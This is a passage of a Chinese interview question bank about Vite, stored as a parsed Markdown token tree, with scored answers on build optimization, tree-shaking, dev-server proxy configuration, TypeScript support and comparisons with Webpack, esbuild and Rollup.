b;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","text":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","tokens":[{"type":"text","raw":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","text":"经过压缩和混淆后可能变成类似function n(a,b){return a + b;}的形式，文件大小也会显著减小。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n\\n- **1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n\\n- **2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n\\n","task":false,"loose":true,"text":"**1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n","tokens":[{"type":"text","raw":"**1：** CSS 优化:</br>\\n\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。\\n","text":"**1：** CSS 优化:</br>\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。</br>\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" CSS 优化:","text":" CSS 优化:","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。","text":"\\n&emsp;(1)提取公共 CSS：Vite 会将多个组件或模块中相同的 CSS 样式提取出来，合并到一个或多个 CSS 文件中。这样可以避免在每个组件的 HTML 文件中重复加载相同的 CSS 代码，减少文件大小和请求次数。","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。","text":"\\n&emsp;(2)压缩 CSS：使用工具（如 cssnano）对 CSS 文件进行压缩，去除不必要的空格、注释，优化 CSS 属性的表示方式等。例如，将color: #ffffff;可能会被优化为color:#fff;。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n\\n","task":false,"loose":true,"text":"**1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n","tokens":[{"type":"text","raw":"**1：** 静态资源处理:</br>\\n\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。\\n","text":"**1：** 静态资源处理:</br>\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。</br>\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 静态资源处理:","text":" 静态资源处理:","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。","text":"\\n&emsp;(1)哈希处理：对静态资源（如图片、字体等）进行哈希处理。当资源内容发生变化时，其哈希值也会改变，这样可以在浏览器中实现长效缓存。浏览器可以根据资源的哈希值判断是否需要重新请求资源。","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。","text":"\\n&emsp;(2)优化路径和加载方式：确保在生产环境中，静态资源的路径是正确的，并且以最优的方式加载。例如，对于一些小的图片，可能会被转换为 Base64 格式嵌入到 CSS 或 HTML 文件中，减少额外的请求。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","task":false,"loose":true,"text":"**2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","tokens":[{"type":"text","raw":"**2：** Tree - Shaking（摇树优化）:</br>\\n\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","text":"**2：** Tree - Shaking（摇树优化）:</br>\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。</br>\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Tree - Shaking（摇树优化）:","text":" Tree - Shaking（摇树优化）:","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。","text":"\\n&emsp;原理：Vite 会分析代码的依赖关系，在打包过程中去除那些没有被实际使用的代码。例如，如果在一个 JavaScript 模块中引入了一个大型库，但只使用了其中的一个小功能，Vite 会将未使用的代码部分剔除。","escaped":false},{"type":"html","raw":"</br>","inLink":false,"inRawBlock":false,"block":false,"text":"</br>"},{"type":"text","raw":"\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","text":"\\n&emsp;示例：假设一个项目引入了lodash库，但只使用了_.isEmpty函数，Vite 会在打包时将lodash中其他未使用的函数代码排除，从而减小最终打包文件的大小。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？\\n\\n","depth":2,"text":"在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？","tokens":[{"type":"text","raw":"在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？","text":"在 Vite 项目中如何配置代理（Proxy）以解决跨域问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","task":false,"loose":false,"text":"**1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","tokens":[{"type":"text","raw":"**1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","text":"**1：** 在 vite.config.js 中配置 server.proxy 选项，例如：","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 vite.config.js 中配置 server.proxy 选项，例如：","text":" 在 vite.config.js 中配置 server.proxy 选项，例如：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\nmodule.exports = {\\n  server: {\\n    proxy: {\\n      \'/api\': {\\n        target: \'http://backend-api-url\',\\n        changeOrigin: true,\\n        rewrite: (path) => path.replace(/^\\\\/api/, \'\')\\n      }\\n    }\\n  }\\n};\\n// 这会将所有以 /api 开头的请求代理到指定的后端 API 地址，并根据 rewrite 规则修改请求路径。\\n```","lang":"js","text":"module.exports = {\\n  server: {\\n    proxy: {\\n      \'/api\': {\\n        target: \'http://backend-api-url\',\\n        changeOrigin: true,\\n        rewrite: (path) => path.replace(/^\\\\/api/, \'\')\\n      }\\n    }\\n  }\\n};\\n// 这会将所有以 /api 开头的请求代理到指定的后端 API 地址，并根据 rewrite 规则修改请求路径。"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 在开发模式下如何实现快速启动？\\n\\n","depth":2,"text":"Vite 在开发模式下如何实现快速启动？","tokens":[{"type":"text","raw":"Vite 在开发模式下如何实现快速启动？","text":"Vite 在开发模式下如何实现快速启动？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","task":false,"loose":false,"text":"**2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","tokens":[{"type":"text","raw":"**2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","text":"**2：** Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","text":" Vite 利用 ES 模块的原生支持，通过浏览器直接加载模块文件，避免了传统打包工具的打包和重构过程。这种方式大大减少了启动时间，实现了快速的热更新和模块替换。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 如何支持 TypeScript？\\n\\n","depth":2,"text":"Vite 如何支持 TypeScript？","tokens":[{"type":"text","raw":"Vite 如何支持 TypeScript？","text":"Vite 如何支持 TypeScript？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","task":false,"loose":false,"text":"**2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","tokens":[{"type":"text","raw":"**2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","text":"**2：** Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","text":" Vite 通过插件系统支持 TypeScript，无需额外配置即可直接处理 TypeScript 文件。Vite 在内部使用 esbuild 预处理 TypeScript 文件，这不仅提高了编译速度，还简化了配置过程。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 与传统的 Webpack 打包工具有何不同？\\n\\n","depth":2,"text":"Vite 与传统的 Webpack 打包工具有何不同？","tokens":[{"type":"text","raw":"Vite 与传统的 Webpack 打包工具有何不同？","text":"Vite 与传统的 Webpack 打包工具有何不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","task":false,"loose":false,"text":"**2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","tokens":[{"type":"text","raw":"**2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","text":"**2：** Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","text":" Vite 主要区别在于其开发模式的实现方式。Vite 在开发时不需要打包，而是直接通过浏览器加载模块，这使得启动速度更快。而 Webpack 在开发模式下仍然需要进行打包和热重载，这通常会更慢。此外，Vite 在生产构建时也采用了更现代的打包策略，如 Rollup，优化了打包输出。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vite 项目构建速度快的原因是什么？\\n\\n","depth":2,"text":"Vite 项目构建速度快的原因是什么？","tokens":[{"type":"text","raw":"Vite 项目构建速度快的原因是什么？","text":"Vite 项目构建速度快的原因是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","task":false,"loose":false,"text":"**1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","tokens":[{"type":"text","raw":"**1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","text":"**1：** Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","text":" Vite 利用了现代浏览器的原生 ES （ES Modules）模块支持，采用了按需加载和热更新技术。在开发过程中，它只加载和处理当前需要的模块，减少了不必要的代码编译和打包工作，并且通过快速\\n的热更新机制，使开发过程中能够迅速响应代码变化，提高了构建速度。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？\\n\\n","depth":2,"text":"esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？","tokens":[{"type":"text","raw":"esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？","text":"esbuild 和 rollup 都是 vite 的基础依赖， 那么他们有啥不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 